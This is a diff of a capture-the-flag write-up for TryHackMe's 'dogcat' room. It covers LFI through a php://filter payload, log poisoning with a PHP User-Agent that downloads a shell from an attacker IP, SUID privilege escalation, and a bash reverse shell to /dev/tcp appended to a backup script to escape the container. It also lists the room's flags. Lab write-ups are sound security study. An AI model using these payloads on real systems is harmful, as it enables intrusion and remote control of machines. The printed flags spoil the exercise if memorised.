@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f436
 ---
+# ENUMERATION
+---
 
-# DOGCAT
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
@@ -35,17 +33,16 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 Let's visit the web application:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326111953.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326111953.png)
 
 If we click on any of them, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326112012.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326112012.png)
 
 We can view that the url is:
 
@@ -55,11 +52,14 @@ http://IP/?view=dog
 
 This view parameter could be vulnerable to LFI, let's try to visualize a resource that may not exist:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326112145.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326112145.png)
 
 If we try anything else, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326113812.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326113812.png)
+
+
 
 This means that we must include either `dog` or `cat` in the request, let's try to read `index.php` using a php wrapper, since we need to include `dog` or `cat`, we can test the following payload:
 
@@ -67,17 +67,20 @@ This means that we must include either `dog` or `cat` in the request, let's try 
 php://filter/convert.base64-encode/resource=dog/../../../../var/www/html/index
 ```
 
+
 If we submit the request:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326114737.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326114737.png)
 
 There we go, we got LFI, let's proceed to exploitation.
 
-## EXPLOITATION
 
-***
+
+# EXPLOITATION
+---
 
 Let's start by reading the `index.php` file:
+
 
 ```html
 <!DOCTYPE HTML>
@@ -115,13 +118,14 @@ Let's start by reading the `index.php` file:
 </html>
 ```
 
+
 From this, we got some valuable stuff, for example, it tries to set the extension to `.php` if `ext` is not defined, knowing this, we can try reading `/etc/passwd`:
 
 ```
 php://filter/convert.base64-encode/resource=./dog/../../../../etc/passwd&ext
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326120715.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326120715.png)
 
 It worked, let's read the contents:
 
@@ -161,7 +165,8 @@ Let's perform the RCE, we can upload a reverse shell to speed up the process, le
 
 In this way, we can see the log:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326124107.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326124107.png)
 
 Now, with this, we can perform log poisoning, let's send the request to our proxy and start a python server to get our `shell.php` file, for this, we need to use the following `User-Agent`:
 
@@ -169,11 +174,11 @@ Now, with this, we can perform log poisoning, let's send the request to our prox
 <?php file_put_contents('shell.php', file_get_contents('http://10.6.34.159:8000/shell.php')); ?>
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326124815.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326124815.png)
 
 Now, let's send the request and refresh the page, we can see in our python server that the file has been indeed downloaded:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326124827.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326124827.png)
 
 We can now simply set up the listener and access the following URL:
 
@@ -183,13 +188,16 @@ http://IP/shell.php
 
 And we can see this in our listener
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326124927.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326124927.png)
 
 We got a shell, let's proceed to privesc.
 
-## PRIVILEGE ESCALATION
 
-***
+
+
+# PRIVILEGE ESCALATION
+---
+
 
 First step would be getting an stable shell:
 
@@ -200,11 +208,11 @@ First step would be getting an stable shell:
 5. export TERM=xterm
 6. export BASH=bash
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326125041.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326125041.png)
 
 If we check `/`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326125149.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326125149.png)
 
 Seems like we are inside of a docker container, let's test:
 
@@ -244,7 +252,7 @@ find / -perm -4000 2>/dev/null
 
 We got something `env`, let's check it on `gtfobins`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326125537.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326125537.png)
 
 We can do the following to get root in the docker container:
 
@@ -252,7 +260,7 @@ We can do the following to get root in the docker container:
 /usr/bin/env /bin/bash -p
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326125619.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326125619.png)
 
 Since we got root we can read some flags, let's start reading them:
 
@@ -275,6 +283,7 @@ bash-5.0# cat /var/www/flag2_QMW7JvaY2LvK.txt
 THM{LF1_t0_RC3_aec3fb}
 ```
 
+
 ```
 bash-5.0# cat /root/flag3.txt
 THM{D1ff3r3nt_3nv1ronments_874112}
@@ -282,7 +291,7 @@ THM{D1ff3r3nt_3nv1ronments_874112}
 
 Ok, we've read the flags, now, we can use the `nmap` binary to scan the network and check if there's anything important to get root on the real machine:
 
-Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap
+Binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
 Let's get it in our local machine and start a python server, now, let's get it:
 
@@ -290,13 +299,14 @@ Let's get it in our local machine and start a python server, now, let's get it:
 curl http://10.6.34.159:8000/nmap -o nmap
 ```
 
+
 If we try scanning the network it does not seem to work, this is not the intended path:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326130533.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326130533.png)
 
 Let's use linpeas then, we must be missing something:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326131049.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326131049.png)
 
 In the backup files, we can see this, there seems to be a `backup.sh` script, let's read it:
 
@@ -320,7 +330,7 @@ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.6.34.159/9001 0>&1" &' >> backup
 
 Set up a new listener, after little time, this happens in our listener:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326132008.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326132008.png)
 
 There we go, we got our root shell, escaping successfully the docker container, let's read final flag:
 
@@ -329,4 +339,5 @@ root@dogcat:~# cat flag4.txt
 THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250326132106.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250326132106.png)
+
